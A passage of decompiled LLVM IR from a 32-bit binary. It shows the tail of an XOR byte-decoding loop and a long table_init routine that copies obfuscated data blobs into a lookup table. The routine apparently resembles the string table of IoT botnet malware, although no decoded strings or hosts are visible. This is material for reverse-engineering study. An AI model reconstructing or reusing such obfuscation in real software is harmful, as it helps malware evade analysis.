  %v5_8050506 = xor i8 %v2_8050506, %v4_8050506
  store i8 %v5_8050506, i8* %v1_8050506, align 1
  %v0_8050508 = load i32, i32* %edx.global-to-local, align 4
  %v0_805050a = load i32, i32* @ecx, align 4
  %v1_805050a = inttoptr i32 %v0_805050a to i32*
  %v2_805050a = load i32, i32* %v1_805050a, align 4
  %v2_805050c = add i32 %v2_805050a, %v0_8050508
  %v0_805050e = load i32, i32* %esi.global-to-local, align 4
  %v1_8050510 = inttoptr i32 %v2_805050c to i8*
  %v2_8050510 = load i8, i8* %v1_8050510, align 1
  %v4_8050510 = trunc i32 %v0_805050e to i8
  %v5_8050510 = xor i8 %v2_8050510, %v4_8050510
  store i8 %v5_8050510, i8* %v1_8050510, align 1
  %v0_8050512 = load i32, i32* %edx.global-to-local, align 4
  %v0_8050514 = load i32, i32* @ecx, align 4
  %v1_8050514 = inttoptr i32 %v0_8050514 to i32*
  %v2_8050514 = load i32, i32* %v1_8050514, align 4
  %v1_8050516 = add i32 %v0_8050512, 1
  store i32 %v1_8050516, i32* %edx.global-to-local, align 4
  %v2_8050517 = add i32 %v2_8050514, %v0_8050512
  %v2_8050519 = load i8, i8* %stack_var_-44, align 1
  %v1_805051c = inttoptr i32 %v2_8050517 to i8*
  %v2_805051c = load i8, i8* %v1_805051c, align 1
  %v5_805051c = xor i8 %v2_805051c, %v2_8050519
  store i8 %v5_805051c, i8* %v1_805051c, align 1
  %v0_805051e = load i32, i32* @ecx, align 4
  %v1_805051e = add i32 %v0_805051e, 4
  %v2_805051e = inttoptr i32 %v1_805051e to i32*
  %v3_805051e = load i32, i32* %v2_805051e, align 4
  %v1_8050521 = urem i32 %v3_805051e, 65536
  %v1_8050526 = load i32, i32* %edx.global-to-local, align 4
  %v8_8050528 = icmp sgt i32 %v1_8050521, %v1_8050526
  br i1 %v8_8050528, label %dec_label_pc_80504f4.dec_label_pc_80504f4_crit_edge, label %dec_label_pc_805052a.loopexit

dec_label_pc_80504f4.dec_label_pc_80504f4_crit_edge: ; preds = %dec_label_pc_80504f4
  %v0_80504fa.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80504f4

dec_label_pc_805052a.loopexit:                    ; preds = %dec_label_pc_80504f4
  br label %dec_label_pc_805052a

dec_label_pc_805052a:                             ; preds = %dec_label_pc_805052a.loopexit, %entry
  %v0_8050531 = phi i32 [ %v1_8050521, %dec_label_pc_805052a.loopexit ], [ %v1_80504d4, %entry ]
  ret i32 %v0_8050531

; uselistorder directives
  uselistorder i32 %v1_8050526, { 1, 0 }
  uselistorder i32 %v1_8050521, { 1, 0 }
  uselistorder i32 %v0_805051e, { 1, 0 }
  uselistorder i32 %v1_80504d4, { 3, 4, 0, 1, 2, 5 }
  uselistorder i8* %stack_var_-44, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805a880.100 to i32), i32 4), { 1, 2, 0 }
  uselistorder i16* @global_var_8057ba4.101, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805a880.100 to i32), { 1, 2, 3, 0 }
}

define i32 @table_init() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8050540 = load i32, i32* @ebx, align 4
  store i32 %v0_8050540, i32* %stack_var_-4, align 4
  %v1_8050546 = call i32 @malloc(i32 2)
  store i32 %v1_8050546, i32* @ebx, align 4
  %v3_8050558 = call i32 @util_memcpy(i32 %v1_8050546, i32 ptrtoint (i32* @global_var_805598c.102 to i32), i32 2)
  %v0_805055d = load i32, i32* @ebx, align 4
  store i32 %v0_805055d, i32* @global_var_805a890.103, align 16
  store i16 2, i16* bitcast (i32* @global_var_805a894.104 to i16*), align 4
  %v1_8050573 = call i32 @malloc(i32 2)
  store i32 %v1_8050573, i32* @ebx, align 4
  %v3_8050585 = call i32 @util_memcpy(i32 %v1_8050573, i32 ptrtoint (i32* @global_var_805598f.105 to i32), i32 2)
  %v0_805058a = load i32, i32* @ebx, align 4
  store i32 %v0_805058a, i32* @global_var_805a8a0.106, align 32
  store i16 2, i16* bitcast (i32* @global_var_805a8a4.107 to i16*), align 4
  %v1_80505a0 = call i32 @malloc(i32 29)
  store i32 %v1_80505a0, i32* @ebx, align 4
  %v3_80505b2 = call i32 @util_memcpy(i32 %v1_80505a0, i32 ptrtoint (i32* @global_var_8055992.108 to i32), i32 29)
  %v0_80505b7 = load i32, i32* @ebx, align 4
  store i32 %v0_80505b7, i32* @global_var_805a8a8.109, align 8
  store i16 29, i16* bitcast (i32* @global_var_805a8ac.110 to i16*), align 4
  %v1_80505cd = call i32 @malloc(i32 7)
  store i32 %v1_80505cd, i32* @ebx, align 4
  %v3_80505df = call i32 @util_memcpy(i32 %v1_80505cd, i32 ptrtoint (i32* @global_var_80559b0.111 to i32), i32 7)
  %v0_80505e4 = load i32, i32* @ebx, align 4
  store i32 %v0_80505e4, i32* @global_var_805a8b0.112, align 16
  store i16 7, i16* bitcast (i32* @global_var_805a8b4.113 to i16*), align 4
  %v1_80505fa = call i32 @malloc(i32 5)
  store i32 %v1_80505fa, i32* @ebx, align 4
  %v3_805060c = call i32 @util_memcpy(i32 %v1_80505fa, i32 ptrtoint (i32* @global_var_80559b8.114 to i32), i32 5)
  %v0_8050611 = load i32, i32* @ebx, align 4
  store i32 %v0_8050611, i32* @global_var_805a8b8.115, align 8
  store i16 5, i16* bitcast (i32* @global_var_805a8bc.116 to i16*), align 4
  %v1_8050627 = call i32 @malloc(i32 4)
  store i32 %v1_8050627, i32* @ebx, align 4
  %v3_8050639 = call i32 @util_memcpy(i32 %v1_8050627, i32 ptrtoint (i32* @global_var_80559be.117 to i32), i32 4)
  %v0_805063e = load i32, i32* @ebx, align 4
  store i32 %v0_805063e, i32* @global_var_805a8c0.118, align 64
  store i16 4, i16* bitcast (i32* @global_var_805a8c4.119 to i16*), align 4
  %v1_8050654 = call i32 @malloc(i32 14)
  store i32 %v1_8050654, i32* @ebx, align 4
  %v3_8050666 = call i32 @util_memcpy(i32 %v1_8050654, i32 ptrtoint (i32* @global_var_80559c3.120 to i32), i32 14)
  %v0_805066b = load i32, i32* @ebx, align 4
  store i32 %v0_805066b, i32* @global_var_805a8c8.121, align 8
  store i16 14, i16* bitcast (i32* @global_var_805a8cc.122 to i16*), align 4
  %v1_8050681 = call i32 @malloc(i32 6)
  store i32 %v1_8050681, i32* @ebx, align 4
  %v3_8050693 = call i32 @util_memcpy(i32 %v1_8050681, i32 ptrtoint (i32* @global_var_80559d2.123 to i32), i32 6)
  %v0_8050698 = load i32, i32* @ebx, align 4
  store i32 %v0_8050698, i32* @global_var_805a8d0.124, align 16
  store i16 6, i16* bitcast (i32* @global_var_805a8d4.125 to i16*), align 4
  %v1_80506ae = call i32 @malloc(i32 8)
  store i32 %v1_80506ae, i32* @ebx, align 4
  %v3_80506c0 = call i32 @util_memcpy(i32 %v1_80506ae, i32 ptrtoint (i32* @global_var_80559d9.126 to i32), i32 8)
  %v0_80506c5 = load i32, i32* @ebx, align 4
  store i32 %v0_80506c5, i32* @global_var_805a8d8.127, align 8
  store i16 8, i16* bitcast (i32* @global_var_805a8dc.128 to i16*), align 4
  %v1_80506db = call i32 @malloc(i32 7)
  store i32 %v1_80506db, i32* @ebx, align 4
  %v3_80506ed = call i32 @util_memcpy(i32 %v1_80506db, i32 ptrtoint (i32* @global_var_80559e2.129 to i32), i32 7)
  %v0_80506f2 = load i32, i32* @ebx, align 4
  store i32 %v0_80506f2, i32* @global_var_805a8e0.130, align 32
  store i16 7, i16* bitcast (i32* @global_var_805a8e4.131 to i16*), align 4
  %v1_8050708 = call i32 @malloc(i32 16)
  store i32 %v1_8050708, i32* @ebx, align 4
  %v3_805071a = call i32 @util_memcpy(i32 %v1_8050708, i32 ptrtoint (i32* @global_var_80559ea.132 to i32), i32 16)
  %v0_805071f = load i32, i32* @ebx, align 4
  store i32 %v0_805071f, i32* @global_var_805a8e8.133, align 8
  store i16 16, i16* bitcast (i32* @global_var_805a8ec.134 to i16*), align 4
  %v1_8050735 = call i32 @malloc(i32 14)
  store i32 %v1_8050735, i32* @ebx, align 4
  %v3_8050747 = call i32 @util_memcpy(i32 %v1_8050735, i32 ptrtoint (i32* @global_var_80559fb.135 to i32), i32 14)
  %v0_805074c = load i32, i32* @ebx, align 4
  store i32 %v0_805074c, i32* @global_var_805a8f0.136, align 16
  store i16 14, i16* bitcast (i32* @global_var_805a8f4.137 to i16*), align 4
  %v1_8050762 = call i32 @malloc(i32 9)
  store i32 %v1_8050762, i32* @ebx, align 4
  %v3_8050774 = call i32 @util_memcpy(i32 %v1_8050762, i32 ptrtoint (i32* @global_var_8055a0a.138 to i32), i32 9)
  %v0_8050779 = load i32, i32* @ebx, align 4
  store i32 %v0_8050779, i32* @global_var_805a8f8.139, align 8
  store i16 9, i16* bitcast (i32* @global_var_805a8fc.140 to i16*), align 4
  %v1_805078f = call i32 @malloc(i32 19)
  store i32 %v1_805078f, i32* @ebx, align 4
  %v3_80507a1 = call i32 @util_memcpy(i32 %v1_805078f, i32 ptrtoint (i32* @global_var_8055a14.141 to i32), i32 19)
  %v0_80507a6 = load i32, i32* @ebx, align 4
  store i32 %v0_80507a6, i32* @global_var_805a900.142, align 256
  store i16 19, i16* bitcast (i32* @global_var_805a904.143 to i16*), align 4
  %v1_80507bc = call i32 @malloc(i32 23)
  store i32 %v1_80507bc, i32* @ebx, align 4
  %v3_80507ce = call i32 @util_memcpy(i32 %v1_80507bc, i32 ptrtoint (i32* @global_var_8055a28.144 to i32), i32 23)
  %v0_80507d3 = load i32, i32* @ebx, align 4
  store i32 %v0_80507d3, i32* @global_var_805a908.145, align 8
  store i16 23, i16* bitcast (i32* @global_var_805a90c.146 to i16*), align 4
  %v1_80507e9 = call i32 @malloc(i32 8)
  store i32 %v1_80507e9, i32* @ebx, align 4
  %v3_80507fb = call i32 @util_memcpy(i32 %v1_80507e9, i32 ptrtoint ([9 x i8]* @global_var_8055a40.147 to i32), i32 8)
  %v0_8050800 = load i32, i32* @ebx, align 4
  store i32 %v0_8050800, i32* @global_var_805a910.148, align 16
  store i16 8, i16* bitcast (i32* @global_var_805a914.149 to i16*), align 4
  %v1_8050816 = call i32 @malloc(i32 14)
  store i32 %v1_8050816, i32* @ebx, align 4
  %v3_8050828 = call i32 @util_memcpy(i32 %v1_8050816, i32 ptrtoint (i32* @global_var_8055a49.150 to i32), i32 14)
  %v0_805082d = load i32, i32* @ebx, align 4
  store i32 %v0_805082d, i32* @global_var_805a918.151, align 8
  store i16 14, i16* bitcast (i32* @global_var_805a91c.152 to i16*), align 4
  %v1_8050843 = call i32 @malloc(i32 19)
  store i32 %v1_8050843, i32* @ebx, align 4
  %v3_8050855 = call i32 @util_memcpy(i32 %v1_8050843, i32 ptrtoint (i32* @global_var_8055a58.153 to i32), i32 19)
  %v0_805085a = load i32, i32* @ebx, align 4
  store i32 %v0_805085a, i32* @global_var_805a920.154, align 32
  store i16 19, i16* bitcast (i32* @global_var_805a924.155 to i16*), align 4
  %v1_8050870 = call i32 @malloc(i32 23)
  store i32 %v1_8050870, i32* @ebx, align 4
  %v3_8050882 = call i32 @util_memcpy(i32 %v1_8050870, i32 ptrtoint (i32* @global_var_8055a6c.156 to i32), i32 23)
  %v0_8050887 = load i32, i32* @ebx, align 4
  store i32 %v0_8050887, i32* @global_var_805a928.157, align 8
  store i16 23, i16* bitcast (i32* @global_var_805a92c.158 to i16*), align 4
  %v1_805089d = call i32 @malloc(i32 24)
  store i32 %v1_805089d, i32* @ebx, align 4
  %v3_80508af = call i32 @util_memcpy(i32 %v1_805089d, i32 ptrtoint (i32* @global_var_8055a84.159 to i32), i32 24)
  %v0_80508b4 = load i32, i32* @ebx, align 4
  store i32 %v0_80508b4, i32* @global_var_805a930.160, align 16
  store i16 24, i16* bitcast (i32* @global_var_805a934.161 to i16*), align 4
  %v1_80508ca = call i32 @malloc(i32 15)
  store i32 %v1_80508ca, i32* @ebx, align 4
  %v3_80508dc = call i32 @util_memcpy(i32 %v1_80508ca, i32 ptrtoint (i32* @global_var_8055a9d.162 to i32), i32 15)
  %v0_80508e1 = load i32, i32* @ebx, align 4
  store i32 %v0_80508e1, i32* @global_var_805a938.163, align 8
  store i16 15, i16* bitcast (i32* @global_var_805a93c.164 to i16*), align 4
  %v1_80508f7 = call i32 @malloc(i32 6)
  store i32 %v1_80508f7, i32* @ebx, align 4
  %v3_8050909 = call i32 @util_memcpy(i32 %v1_80508f7, i32 ptrtoint ([7 x i8]* @global_var_8055aad.165 to i32), i32 6)
  %v0_805090e = load i32, i32* @ebx, align 4
  store i32 %v0_805090e, i32* @global_var_805a940.166, align 64
  store i16 6, i16* bitcast (i32* @global_var_805a944.167 to i16*), align 4
  %v1_8050924 = call i32 @malloc(i32 7)
  store i32 %v1_8050924, i32* @ebx, align 4
  %v3_8050936 = call i32 @util_memcpy(i32 %v1_8050924, i32 ptrtoint ([8 x i8]* @global_var_8055ab4.168 to i32), i32 7)
  %v0_805093b = load i32, i32* @ebx, align 4
  store i32 %v0_805093b, i32* @global_var_805a948.169, align 8
  store i16 7, i16* bitcast (i32* @global_var_805a94c.170 to i16*), align 4
  %v1_8050951 = call i32 @malloc(i32 7)
  store i32 %v1_8050951, i32* @ebx, align 4
  %v3_8050963 = call i32 @util_memcpy(i32 %v1_8050951, i32 ptrtoint ([8 x i8]* @global_var_8055abc.171 to i32), i32 7)
  %v0_8050968 = load i32, i32* @ebx, align 4
  store i32 %v0_8050968, i32* @global_var_805a950.172, align 16
  store i16 7, i16* bitcast (i32* @global_var_805a954.173 to i16*), align 4
  %v1_805097e = call i32 @malloc(i32 3)
  store i32 %v1_805097e, i32* @ebx, align 4
  %v3_8050990 = call i32 @util_memcpy(i32 %v1_805097e, i32 ptrtoint ([4 x i8]* @global_var_8055ac4.174 to i32), i32 3)
  %v0_8050995 = load i32, i32* @ebx, align 4
  store i32 %v0_8050995, i32* @global_var_805a958.175, align 8
  store i16 3, i16* bitcast (i32* @global_var_805a95c.176 to i16*), align 4
  %v1_80509ab = call i32 @malloc(i32 23)
  store i32 %v1_80509ab, i32* @ebx, align 4
  %v3_80509bd = call i32 @util_memcpy(i32 %v1_80509ab, i32 ptrtoint (i32* @global_var_8055ac8.177 to i32), i32 23)
  %v0_80509c2 = load i32, i32* @ebx, align 4
  store i32 %v0_80509c2, i32* @global_var_805a960.178, align 32
  store i16 23, i16* bitcast (i32* @global_var_805a964.179 to i16*), align 4
  %v1_80509d8 = call i32 @malloc(i32 28)
  store i32 %v1_80509d8, i32* @ebx, align 4
  %v3_80509ea = call i32 @util_memcpy(i32 %v1_80509d8, i32 ptrtoint (i32* @global_var_8055ae0.180 to i32), i32 28)
  %v0_80509ef = load i32, i32* @ebx, align 4
  store i32 %v0_80509ef, i32* @global_var_805a968.181, align 8
  store i16 28, i16* bitcast (i32* @global_var_805a96c.182 to i16*), align 4
  %v1_8050a05 = call i32 @malloc(i32 9)
  store i32 %v1_8050a05, i32* @ebx, align 4
  %v3_8050a17 = call i32 @util_memcpy(i32 %v1_8050a05, i32 ptrtoint ([10 x i8]* @global_var_8055afd.183 to i32), i32 9)
  %v0_8050a1c = load i32, i32* @ebx, align 4
  store i32 %v0_8050a1c, i32* @global_var_805a970.184, align 16
  store i16 9, i16* bitcast (i32* @global_var_805a974.185 to i16*), align 4
  %v1_8050a32 = call i32 @malloc(i32 8)
  store i32 %v1_8050a32, i32* @ebx, align 4
  %v3_8050a44 = call i32 @util_memcpy(i32 %v1_8050a32, i32 ptrtoint ([9 x i8]* @global_var_8055a40.147 to i32), i32 8)
  %v0_8050a49 = load i32, i32* @ebx, align 4
  store i32 %v0_8050a49, i32* @global_var_805a978.186, align 8
  store i16 8, i16* bitcast (i32* @global_var_805a97c.187 to i16*), align 4
  %v1_8050a5f = call i32 @malloc(i32 5)
  store i32 %v1_8050a5f, i32* @ebx, align 4
  %v3_8050a71 = call i32 @util_memcpy(i32 %v1_8050a5f, i32 ptrtoint ([6 x i8]* @global_var_8055b07.188 to i32), i32 5)
  %v0_8050a76 = load i32, i32* @ebx, align 4
  store i32 %v0_8050a76, i32* @global_var_805a980.189, align 128
  store i16 5, i16* bitcast (i32* @global_var_805a984.190 to i16*), align 4
  %v1_8050a8c = call i32 @malloc(i32 6)
  store i32 %v1_8050a8c, i32* @ebx, align 4
  %v3_8050a9e = call i32 @util_memcpy(i32 %v1_8050a8c, i32 ptrtoint ([7 x i8]* @global_var_8055b0d.191 to i32), i32 6)
  %v0_8050aa3 = load i32, i32* @ebx, align 4
  store i32 %v0_8050aa3, i32* @global_var_805a988.192, align 8
  store i16 6, i16* bitcast (i32* @global_var_805a98c.193 to i16*), align 4
  %v1_8050ab9 = call i32 @malloc(i32 16)
  store i32 %v1_8050ab9, i32* @ebx, align 4
  %v3_8050acb = call i32 @util_memcpy(i32 %v1_8050ab9, i32 ptrtoint (i32* @global_var_8055b14.194 to i32), i32 16)
  %v0_8050ad0 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ad0, i32* @global_var_805a990.195, align 16
  store i16 16, i16* bitcast (i32* @global_var_805a994.196 to i16*), align 4
  %v1_8050ae6 = call i32 @malloc(i32 21)
  store i32 %v1_8050ae6, i32* @ebx, align 4
  %v3_8050af8 = call i32 @util_memcpy(i32 %v1_8050ae6, i32 ptrtoint (i32* @global_var_8055b25.197 to i32), i32 21)
  %v0_8050afd = load i32, i32* @ebx, align 4
  store i32 %v0_8050afd, i32* @global_var_805a998.198, align 8
  store i16 21, i16* bitcast (i32* @global_var_805a99c.199 to i16*), align 4
  %v1_8050b13 = call i32 @malloc(i32 21)
  store i32 %v1_8050b13, i32* @ebx, align 4
  %v3_8050b25 = call i32 @util_memcpy(i32 %v1_8050b13, i32 ptrtoint (i32* @global_var_8055b3b.200 to i32), i32 21)
  %v0_8050b2a = load i32, i32* @ebx, align 4
  store i32 %v0_8050b2a, i32* @global_var_805a9a0.201, align 32
  store i16 21, i16* bitcast (i32* @global_var_805a9a4.202 to i16*), align 4
  %v1_8050b40 = call i32 @malloc(i32 17)
  store i32 %v1_8050b40, i32* @ebx, align 4
  %v3_8050b52 = call i32 @util_memcpy(i32 %v1_8050b40, i32 ptrtoint (i32* @global_var_8055b51.203 to i32), i32 17)
  %v0_8050b57 = load i32, i32* @ebx, align 4
  store i32 %v0_8050b57, i32* @global_var_805a9a8.204, align 8
  store i16 17, i16* bitcast (i32* @global_var_805a9ac.205 to i16*), align 4
  %v1_8050b6d = call i32 @malloc(i32 11)
  store i32 %v1_8050b6d, i32* @ebx, align 4
  %v3_8050b7f = call i32 @util_memcpy(i32 %v1_8050b6d, i32 ptrtoint ([12 x i8]* @global_var_8055b63.206 to i32), i32 11)
  %v0_8050b84 = load i32, i32* @ebx, align 4
  store i32 %v0_8050b84, i32* @global_var_805a9b0.207, align 16
  store i16 11, i16* bitcast (i32* @global_var_805a9b4.208 to i16*), align 4
  %v1_8050b9a = call i32 @malloc(i32 23)
  store i32 %v1_8050b9a, i32* @ebx, align 4
  %v3_8050bac = call i32 @util_memcpy(i32 %v1_8050b9a, i32 ptrtoint (i32* @global_var_8055b6f.209 to i32), i32 23)
  %v0_8050bb1 = load i32, i32* @ebx, align 4
  store i32 %v0_8050bb1, i32* @global_var_805a9b8.210, align 8
  store i16 23, i16* bitcast (i32* @global_var_805a9bc.211 to i16*), align 4
  %v1_8050bc7 = call i32 @malloc(i32 83)
  store i32 %v1_8050bc7, i32* @ebx, align 4
  %v3_8050bd9 = call i32 @util_memcpy(i32 %v1_8050bc7, i32 ptrtoint (i32* @global_var_8055c2c.212 to i32), i32 83)
  %v0_8050bde = load i32, i32* @ebx, align 4
  store i32 %v0_8050bde, i32* @global_var_805a9c0.213, align 64
  store i16 83, i16* bitcast (i32* @global_var_805a9c4.214 to i16*), align 4
  %v1_8050bf4 = call i32 @malloc(i32 32)
  store i32 %v1_8050bf4, i32* @ebx, align 4
  %v3_8050c06 = call i32 @util_memcpy(i32 %v1_8050bf4, i32 ptrtoint (i32* @global_var_8055c80.215 to i32), i32 32)
  %v0_8050c0b = load i32, i32* @ebx, align 4
  store i32 %v0_8050c0b, i32* @global_var_805a9c8.216, align 8
  store i16 32, i16* bitcast (i32* @global_var_805a9cc.217 to i16*), align 4
  %v1_8050c21 = call i32 @malloc(i32 48)
  store i32 %v1_8050c21, i32* @ebx, align 4
  %v3_8050c33 = call i32 @util_memcpy(i32 %v1_8050c21, i32 ptrtoint (i32* @global_var_8055ca4.218 to i32), i32 48)
  %v0_8050c38 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c38, i32* @global_var_805a9d0.219, align 16
  store i16 48, i16* bitcast (i32* @global_var_805a9d4.220 to i16*), align 4
  %v1_8050c4e = call i32 @malloc(i32 12)
  store i32 %v1_8050c4e, i32* @ebx, align 4
  %v3_8050c60 = call i32 @util_memcpy(i32 %v1_8050c4e, i32 ptrtoint (i32* @global_var_8055b87.221 to i32), i32 12)
  %v0_8050c65 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c65, i32* @global_var_805a9d8.222, align 8
  store i16 12, i16* bitcast (i32* @global_var_805a9dc.223 to i16*), align 4
  %v1_8050c7b = call i32 @malloc(i32 9)
  store i32 %v1_8050c7b, i32* @ebx, align 4
  %v3_8050c8d = call i32 @util_memcpy(i32 %v1_8050c7b, i32 ptrtoint (i32* @global_var_8055b94.224 to i32), i32 9)
  %v0_8050c92 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c92, i32* @global_var_805a9e0.225, align 32
  store i16 9, i16* bitcast (i32* @global_var_805a9e4.226 to i16*), align 4
  %v1_8050ca8 = call i32 @malloc(i32 10)
  store i32 %v1_8050ca8, i32* @ebx, align 4
  %v3_8050cba = call i32 @util_memcpy(i32 %v1_8050ca8, i32 ptrtoint (i32* @global_var_8055b9e.227 to i32), i32 10)
  %v0_8050cbf = load i32, i32* @ebx, align 4
  store i32 %v0_8050cbf, i32* @global_var_805a9e8.228, align 8
  store i16 10, i16* bitcast (i32* @global_var_805a9ec.229 to i16*), align 4
  %v1_8050cd5 = call i32 @malloc(i32 12)
  store i32 %v1_8050cd5, i32* @ebx, align 4
  %v3_8050ce7 = call i32 @util_memcpy(i32 %v1_8050cd5, i32 ptrtoint (i32* @global_var_8055ba9.230 to i32), i32 12)
  %v0_8050cec = load i32, i32* @ebx, align 4
  store i32 %v0_8050cec, i32* @global_var_805a9f0.231, align 16
  store i16 12, i16* bitcast (i32* @global_var_805a9f4.232 to i16*), align 4
  %v1_8050d02 = call i32 @malloc(i32 16)
  store i32 %v1_8050d02, i32* @ebx, align 4
  %v3_8050d14 = call i32 @util_memcpy(i32 %v1_8050d02, i32 ptrtoint (i32* @global_var_8055bb6.233 to i32), i32 16)
  %v0_8050d19 = load i32, i32* @ebx, align 4
  store i32 %v0_8050d19, i32* @global_var_805a9f8.234, align 8
  store i16 16, i16* bitcast (i32* @global_var_805a9fc.235 to i16*), align 4
  %v1_8050d2f = call i32 @malloc(i32 19)
  store i32 %v1_8050d2f, i32* @ebx, align 4
  %v3_8050d41 = call i32 @util_memcpy(i32 %v1_8050d2f, i32 ptrtoint (i32* @global_var_8055bc7.236 to i32), i32 19)
  %v0_8050d46 = load i32, i32* @ebx, align 4
  store i32 %v0_8050d46, i32* @global_var_805aa00.237, align 512
  store i16 19, i16* bitcast (i32* @global_var_805aa04.238 to i16*), align 4
  %v1_8050d5c = call i32 @malloc(i32 8)
  store i32 %v1_8050d5c, i32* @ebx, align 4
  %v3_8050d6e = call i32 @util_memcpy(i32 %v1_8050d5c, i32 ptrtoint ([9 x i8]* @global_var_8055bdb.239 to i32), i32 8)
  %v0_8050d73 = load i32, i32* @ebx, align 4
  store i32 %v0_8050d73, i32* @global_var_805aa08.240, align 8
  store i16 8, i16* bitcast (i32* @global_var_805aa0c.241 to i16*), align 4
  %v1_8050d89 = call i32 @malloc(i32 11)
  store i32 %v1_8050d89, i32* @ebx, align 4
  %v3_8050d9b = call i32 @util_memcpy(i32 %v1_8050d89, i32 ptrtoint (i32* @global_var_8055b7b.242 to i32), i32 11)
  %v0_8050da0 = load i32, i32* @ebx, align 4
  store i32 %v0_8050da0, i32* @global_var_805aa10.243, align 16
  store i16 11, i16* bitcast (i32* @global_var_805aa14.244 to i16*), align 4
  %v1_8050db6 = call i32 @malloc(i32 12)
  store i32 %v1_8050db6, i32* @ebx, align 4
  %v3_8050dc8 = call i32 @util_memcpy(i32 %v1_8050db6, i32 ptrtoint (i32* @global_var_8055be4.245 to i32), i32 12)
  %v0_8050dcd = load i32, i32* @ebx, align 4
  store i32 %v0_8050dcd, i32* @global_var_805aa18.246, align 8
  store i16 12, i16* bitcast (i32* @global_var_805aa1c.247 to i16*), align 4
  %v1_8050de3 = call i32 @malloc(i32 18)
  store i32 %v1_8050de3, i32* @ebx, align 4
  %v3_8050df5 = call i32 @util_memcpy(i32 %v1_8050de3, i32 ptrtoint (i32* @global_var_8055bf1.248 to i32), i32 18)
  %v0_8050dfa = load i32, i32* @ebx, align 4
  store i32 %v0_8050dfa, i32* @global_var_805aa20.249, align 32
  store i16 18, i16* bitcast (i32* @global_var_805aa24.250 to i16*), align 4
  %v1_8050e10 = call i32 @malloc(i32 25)
  store i32 %v1_8050e10, i32* @ebx, align 4
  %v3_8050e22 = call i32 @util_memcpy(i32 %v1_8050e10, i32 ptrtoint (i32* @global_var_8055c04.251 to i32), i32 25)
  %v0_8050e27 = load i32, i32* @ebx, align 4
  store i32 %v0_8050e27, i32* @global_var_805aa28.252, align 8
  store i16 25, i16* bitcast (i32* @global_var_805aa2c.253 to i16*), align 4
  %v1_8050e3d = call i32 @malloc(i32 115)
  store i32 %v1_8050e3d, i32* @ebx, align 4
  %v3_8050e4f = call i32 @util_memcpy(i32 %v1_8050e3d, i32 ptrtoint (i32* @global_var_8055cd8.254 to i32), i32 115)
  %v0_8050e54 = load i32, i32* @ebx, align 4
  store i32 %v0_8050e54, i32* @global_var_805aa30.255, align 16
  store i16 115, i16* bitcast (i32* @global_var_805aa34.256 to i16*), align 4
  %v1_8050e6a = call i32 @malloc(i32 115)
  store i32 %v1_8050e6a, i32* @ebx, align 4
  %v3_8050e7c = call i32 @util_memcpy(i32 %v1_8050e6a, i32 ptrtoint (i32* @global_var_8055d4c.257 to i32), i32 115)
  %v0_8050e81 = load i32, i32* @ebx, align 4
  store i32 %v0_8050e81, i32* @global_var_805aa38.258, align 8
  store i16 115, i16* bitcast (i32* @global_var_805aa3c.259 to i16*), align 4
  %v1_8050e97 = call i32 @malloc(i32 79)
  store i32 %v1_8050e97, i32* @ebx, align 4
  %v3_8050ea9 = call i32 @util_memcpy(i32 %v1_8050e97, i32 ptrtoint (i32* @global_var_8055dc0.260 to i32), i32 79)
  %v0_8050eae = load i32, i32* @ebx, align 4
  store i32 %v0_8050eae, i32* @global_var_805aa40.261, align 64
  store i16 79, i16* bitcast (i32* @global_var_805aa44.262 to i16*), align 4
  %v1_8050ec4 = call i32 @malloc(i32 114)
  store i32 %v1_8050ec4, i32* @ebx, align 4
  %v3_8050ed6 = call i32 @util_memcpy(i32 %v1_8050ec4, i32 ptrtoint (i32* @global_var_8055e10.263 to i32), i32 114)
  %v0_8050edb = load i32, i32* @ebx, align 4
  store i32 %v0_8050edb, i32* @global_var_805aa48.264, align 8
  store i16 114, i16* bitcast (i32* @global_var_805aa4c.265 to i16*), align 4
  %v1_8050ef1 = call i32 @malloc(i32 114)
  store i32 %v1_8050ef1, i32* @ebx, align 4
  %v3_8050f03 = call i32 @util_memcpy(i32 %v1_8050ef1, i32 ptrtoint (i32* @global_var_8055e84.266 to i32), i32 114)
  %v0_8050f08 = load i32, i32* @ebx, align 4
  store i32 %v0_8050f08, i32* @global_var_805aa50.267, align 16
  store i16 114, i16* bitcast (i32* @global_var_805aa54.268 to i16*), align 4
  %v1_8050f1e = call i32 @malloc(i32 14)
  store i32 %v1_8050f1e, i32* @ebx, align 4
  %v3_8050f30 = call i32 @util_memcpy(i32 %v1_8050f1e, i32 ptrtoint (i32* @global_var_8055a49.150 to i32), i32 14)
  %v0_8050f35 = load i32, i32* @ebx, align 4
  store i32 %v0_8050f35, i32* @global_var_805aa58.269, align 8
  store i16 14, i16* bitcast (i32* @global_var_805aa5c.270 to i16*), align 4
  %v1_8050f4b = call i32 @malloc(i32 19)
  store i32 %v1_8050f4b, i32* @ebx, align 4
  %v3_8050f5d = call i32 @util_memcpy(i32 %v1_8050f4b, i32 ptrtoint (i32* @global_var_8055a58.153 to i32), i32 19)
  %v0_8050f62 = load i32, i32* @ebx, align 4
  store i32 %v0_8050f62, i32* @global_var_805aa60.271, align 32
  store i16 19, i16* bitcast (i32* @global_var_805aa64.272 to i16*), align 4
  %v1_8050f78 = call i32 @malloc(i32 23)
  store i32 %v1_8050f78, i32* @ebx, align 4
  %v3_8050f8a = call i32 @util_memcpy(i32 %v1_8050f78, i32 ptrtoint (i32* @global_var_8055a28.144 to i32), i32 23)
  %v0_8050f8f = load i32, i32* @ebx, align 4
  store i32 %v0_8050f8f, i32* @global_var_805aa68.273, align 8
  store i16 23, i16* bitcast (i32* @global_var_805aa6c.274 to i16*), align 4
  %v1_8050fa5 = call i32 @malloc(i32 10)
  store i32 %v1_8050fa5, i32* @ebx, align 4
  %v3_8050fb7 = call i32 @util_memcpy(i32 %v1_8050fa5, i32 ptrtoint ([11 x i8]* @global_var_8055c1e.275 to i32), i32 10)
  %v0_8050fbc = load i32, i32* @ebx, align 4
  store i32 %v0_8050fbc, i32* @global_var_805aa70.276, align 16
  store i16 10, i16* bitcast (i32* @global_var_805aa74.277 to i16*), align 4
  %v2_8050fce = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050fce, i32* @ebx, align 4
